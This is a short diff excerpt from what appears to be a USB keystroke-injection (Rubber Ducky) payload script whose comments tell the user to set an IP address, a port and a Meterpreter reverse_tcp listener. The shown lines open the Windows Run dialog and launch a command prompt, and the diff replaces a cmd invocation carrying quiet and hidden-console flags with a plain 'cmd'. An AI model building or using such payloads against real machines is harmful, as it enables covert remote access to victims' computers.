@@ -2,7 +2,7 @@ REM Change IPADDR and PORT to match your system
 REM Listener should be set to windows/x64/meterpreter/reverse_tcp
 GUI r
 DELAY 1000
-STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+STRING cmd
 DELAY 500
 ENTER
 DELAY 750
